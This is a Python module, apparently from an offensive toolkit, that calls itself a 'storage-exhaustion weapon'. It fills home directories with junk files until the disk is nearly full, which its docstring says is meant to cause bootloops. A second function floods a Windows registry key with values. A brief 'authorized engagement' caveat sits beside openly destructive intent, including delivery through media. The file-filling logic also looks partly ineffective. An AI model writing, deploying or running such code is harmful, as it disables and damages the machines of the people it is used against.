"""quantum.weapons.techniques.flashfill — storage-exhaustion weapon."""
from __future__ import annotations

import os

from quantum.core.logging import log


def flashfill(paths=None, stop_frac=0.98, max_files=100000):
    """FLASHFILL: storage-exhaustion weapon. Sprays empty table-like files until
    the filesystem is critically full — on many platforms the next reboot then
    hits panic/repair loops (user-requested 'fill + bootloop' effect via media
    delivery). Authorized-engagement destructive control: run on YOUR boxes."""
    if paths is None:
        paths = ["C:\\Users"] if os.name == "nt" else ["/Users", "/home"]
    n = 0

    def _usage(d):
        try:
            if os.name != "nt":
                st = os.statvfs(d); return 1 - (st.f_bavail / st.f_blocks)
            import shutil as sh; t, u, f = sh.disk_usage(d); return u / t if t else 1
        except Exception:
            return 0.0
    for base in paths:
        if not os.path.isdir(base): continue
        tgt = os.path.join(base, ".qcli_flash")
        os.makedirs(tgt, exist_ok=True)
        while _usage(base) < stop_frac and n < max_files:
            fn = os.path.join(tgt, f"t{n:07d}.db")
            try:
                with open(fn, "wb") as f: f.write(b"\x00" * 1)
                n += 1
            except OSError:
                break
    full = _usage(paths[0]) >= stop_frac - 0.02
    log(f"FLASHFILL: {n} tables written, volume full={full}", "ATK")
    return {"files": n, "volume_full": full}


def flashfill_registry(stop=50000):
    """FLASHFILL registry variant (Windows): zero-value keys until hive bloat."""
    n = 0
    try:
        import winreg
        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\qcLi\\ff")
        for i in range(stop):
            winreg.SetValueEx(k, f"t{i}", 0, winreg.REG_SZ, "")
            n += 1
    except ImportError:
        return {"registry_files": 0, "os": "non-windows"}
    log(f"FLASHFILL-REG: {n} keys", "ATK")
    return {"registry_files": n}
